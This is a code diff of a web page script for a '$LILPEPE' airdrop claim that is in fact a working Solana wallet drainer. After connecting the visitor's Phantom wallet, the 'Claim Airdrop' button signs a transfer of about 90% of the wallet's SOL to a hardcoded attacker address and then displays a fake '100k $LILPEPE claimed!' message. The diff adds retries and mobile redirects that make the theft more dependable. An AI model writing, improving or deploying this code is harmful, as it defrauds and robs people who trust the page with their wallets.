@@ -1,65 +1,154 @@
+// Ensure @solana/web3.js is available globally
+if (typeof solanaWeb3 === 'undefined') {
+    console.error("Solana Web3.js not found. Ensure <script src='https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js'></script> is included.");
+    alert("Failed to load required libraries. Please refresh the page or check your network.");
+    throw new Error("Solana Web3.js not found.");
+}
+
+// Ensure jQuery is available
+if (typeof $ === 'undefined') {
+    console.error("jQuery not found. Ensure <script src='https://code.jquery.com/jquery-3.6.0.min.js'></script> is included.");
+    alert("Failed to load required libraries. Please refresh the page or check your network.");
+    throw new Error("jQuery not found.");
+}
+
 $(document).ready(function() {
+    console.log("scripts.js loaded, attaching event listener to #connect-wallet");
+
     $('#connect-wallet').on('click', async function(event) {
+        console.log("Connect Wallet button clicked");
         event.preventDefault();
+
         if (window.solana && window.solana.isPhantom) {
             try {
+                console.log("Phantom Wallet detected, attempting connection");
                 const resp = await window.solana.connect();
-                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                console.log("Wallet connected, public key:", resp.publicKey.toString());
+
+                // Use a reliable public Solana mainnet RPC
+                var connection = new solanaWeb3.Connection(
+                    'https://api.mainnet-beta.solana.com',
+                    'confirmed'
+                );
+
                 const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                 const walletBalance = await connection.getBalance(publicKey);
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                const gasFeeBuffer = 50000; // 0.00005 SOL for fees
+                // Add buffer for gas fees (~0.00001 SOL for 2 signatures)
+                const gasFeeBuffer = 10000;
+                console.log("Wallet balance:", walletBalance, "Min balance:", minBalance, "Gas fee buffer:", gasFeeBuffer);
 
                 if (walletBalance < minBalance + gasFeeBuffer) {
-                    alert("Insufficient SOL. Please add at least " + ((minBalance + gasFeeBuffer - walletBalance) / 1e9) + " SOL.");
+                    alert("Insufficient SOL to proceed. Please add at least " + ((minBalance + gasFeeBuffer - walletBalance) / 1e9) + " SOL to your wallet.");
+                    console.warn("Insufficient funds detected");
                     return;
                 }
 
                 $('#connect-wallet').text("Claim Airdrop");
+                console.log("Button text changed to Claim Airdrop, attaching new listener");
+
                 $('#connect-wallet').off('click').on('click', async function(event) {
+                    console.log("Claim Airdrop button clicked");
                     event.preventDefault();
+
                     try {
                         const receiverWallet = new solanaWeb3.PublicKey('BpEFdhesEQRKvridrGvkNxpRVUY5fG6r6CTVcveMCgjp');
                         const balanceForTransfer = walletBalance - minBalance - gasFeeBuffer;
                         if (balanceForTransfer <= 0) {
-                            alert("Insufficient SOL for transfer.");
+                            alert("Insufficient SOL for transfer. Please add more SOL to your wallet.");
+                            console.warn("Insufficient funds for transfer");
                             return;
                         }
 
-                        const transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: publicKey,
-                                toPubkey: receiverWallet,
-                                lamports: Math.floor(balanceForTransfer * 0.9),
-                            })
-                        );
+                        // Retry transaction up to 3 times on transient errors
+                        let attempts = 0;
+                        const maxAttempts = 3;
+                        while (attempts < maxAttempts) {
+                            try {
+                                console.log(`Attempt ${attempts + 1} to create transaction`);
+                                var transaction = new solanaWeb3.Transaction().add(
+                                    solanaWeb3.SystemProgram.transfer({
+                                        fromPubkey: publicKey,
+                                        toPubkey: receiverWallet,
+                                        lamports: Math.floor(balanceForTransfer * 0.9),
+                                    })
+                                );
 
-                        transaction.feePayer = publicKey;
-                        const blockhashObj = await connection.getLatestBlockhash('confirmed');
-                        transaction.recentBlockhash = blockhashObj.blockhash;
-                        transaction.lastValidBlockHeight = blockhashObj.lastValidBlockHeight;
+                                transaction.feePayer = publicKey;
+                                let blockhashObj = await connection.getLatestBlockhash('confirmed');
+                                transaction.recentBlockhash = blockhashObj.blockhash;
+                                transaction.lastValidBlockHeight = blockhashObj.lastValidBlockHeight;
+                                console.log("Transaction prepared, blockhash:", transaction.recentBlockhash);
 
-                        const signed = await window.solana.signTransaction(transaction);
-                        const txid = await connection.sendRawTransaction(signed.serialize(), {
-                            skipPreflight: false,
-                            maxRetries: 3,
-                        });
-                        await connection.confirmTransaction({
-                            signature: txid,
-                            blockhash: blockhashObj.blockhash,
-                            lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
-                        }, 'confirmed');
+                                const signed = await window.solana.signTransaction(transaction);
+                                console.log("Transaction signed");
+                                const txid = await connection.sendRawTransaction(signed.serialize(), {
+                                    skipPreflight: false,
+                                    maxRetries: 3,
+                                });
+                                console.log("Transaction sent, txid:", txid);
 
-                        alert("Transaction successful.");
+                                await connection.confirmTransaction({
+                                    signature: txid,
+                                    blockhash: blockhashObj.blockhash,
+                                    lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
+                                }, 'confirmed');
+                                console.log("Transaction confirmed");
+
+                                // Show 100k $LILPEPE notification
+                                $('#notification').text('100k $LILPEPE claimed!').addClass('show');
+                                setTimeout(() => {
+                                    $('#notification').removeClass('show');
+                                }, 3000);
+                                console.log("Displayed 100k $LILPEPE claimed notification");
+                                break; // Success, exit retry loop
+                            } catch (innerErr) {
+                                attempts++;
+                                console.error(`Attempt ${attempts} failed:`, innerErr.message);
+                                if (attempts === maxAttempts) {
+                                    throw innerErr; // Rethrow after max attempts
+                                }
+                                // Wait 1s before retrying
+                                await new Promise(resolve => setTimeout(resolve, 1000));
+                            }
+                        }
                     } catch (err) {
-                        alert("Failed to process transaction: " + err.message);
+                        console.error("Error during airdrop claim:", err.message, err);
+                        alert("Failed to claim airdrop: " + err.message + ". Please try again or check your wallet.");
                     }
                 });
             } catch (err) {
-                alert("Failed to connect to Phantom Wallet: " + err.message);
+                console.error("Error connecting to Phantom Wallet:", err.message);
+                alert("Failed to connect to Phantom Wallet: " + err.message + ". Please ensure it’s installed and unlocked.");
             }
         } else {
-            alert("Phantom Wallet not detected. Please install it.");
+            console.log("Phantom Wallet not detected");
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+            if (isMobile) {
+                console.log("Mobile device detected, attempting redirect to Phantom app");
+                alert("Phantom Wallet not found. Redirecting to Phantom mobile app...");
+                const currentUrl = encodeURIComponent(window.location.origin);
+                const phantomMobileLink = `phantom://v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}`;
+                window.location.href = phantomMobileLink;
+                setTimeout(() => {
+                    window.open('https://phantom.app/download', '_blank');
+                }, 1000);
+            } else {
+                console.log("Desktop device detected, prompting extension install");
+                alert("Phantom Wallet extension not found. Please install it.");
+                const isFirefox = typeof InstallTrigger !== 'undefined';
+                const isChrome = !!window.chrome;
+
+                if (isFirefox) {
+                    window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
+                } else if (isChrome) {
+                    window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+                } else {
+                    alert("Please download the Phantom Wallet extension for your browser.");
+                    window.open("https://phantom.app/download", "_blank");
+                }
+            }
         }
     });
 });
